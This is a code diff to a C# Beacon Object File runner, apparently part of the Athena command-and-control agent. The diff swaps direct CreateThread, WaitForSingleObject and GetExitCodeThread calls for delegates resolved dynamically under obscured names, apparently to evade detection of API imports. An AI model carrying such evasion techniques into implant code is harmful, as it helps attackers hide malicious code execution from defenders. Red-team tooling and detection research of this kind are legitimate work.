@@ -1,4 +1,5 @@
 #define _AMD64
+using Athena.Commands;
 using Plugins;
 using System;
 using System.Collections.Generic;
@@ -12,8 +13,10 @@ namespace coff.coff
 {
     class BofRunner
     {
-
-      //test
+        private DynamicHandler.DynamicCrtThrd dlgCrtThrd = (DynamicHandler.DynamicCrtThrd)DynamicHandler.findDeleg("kernel32.dll", DynamicHandler.CrtThrd, typeof(DynamicHandler.DynamicCrtThrd));
+        private DynamicHandler.DynamicWaitForSingleObject dlgWaitForObject = (DynamicHandler.DynamicWaitForSingleObject)DynamicHandler.findDeleg("kernel32.dll", DynamicHandler.WitFrObj, typeof(DynamicHandler.DynamicWaitForSingleObject));
+        private DynamicHandler.DynamicGetExitCdeThrd dlgExtCdeThrd = (DynamicHandler.DynamicGetExitCdeThrd)DynamicHandler.findDeleg("kernel32.dll", DynamicHandler.GetExtCd, typeof(DynamicHandler.DynamicGetExitCdeThrd));
+        //test
         private readonly Coff beacon_helper;
         private Coff bof;
         public IntPtr entry_point;
@@ -82,13 +85,13 @@ namespace coff.coff
         public BofRunnerOutput RunBof(uint timeout)
         {
             StringBuilder debug_output = new StringBuilder();
-            IntPtr hThread = NativeDeclarations.CreateThread(IntPtr.Zero, 0, this.entry_point, IntPtr.Zero, 0, IntPtr.Zero);
+            IntPtr hThread = dlgCrtThrd(IntPtr.Zero, 0, this.entry_point, IntPtr.Zero, 0, IntPtr.Zero);
             uint thread_timeout = 0;
             if (!uint.TryParse(this.parsed_args["timeout"], out thread_timeout)){
                 thread_timeout = 60;
             }
             //var resp = NativeDeclarations.WaitForSingleObject(hThread, thread_timeout * 1000);
-            var resp = NativeDeclarations.WaitForSingleObject(hThread, 86400 * 1000);
+            var resp = dlgWaitForObject(hThread, 86400 * 1000);
 
             if (resp == (uint)NativeDeclarations.WaitEventEnum.WAIT_TIMEOUT)
             {
@@ -99,7 +102,7 @@ namespace coff.coff
 
             int ExitCode;
 
-            NativeDeclarations.GetExitCodeThread(hThread, out ExitCode);
+            dlgExtCdeThrd(hThread, out ExitCode);
 
 
             if (ExitCode < 0)
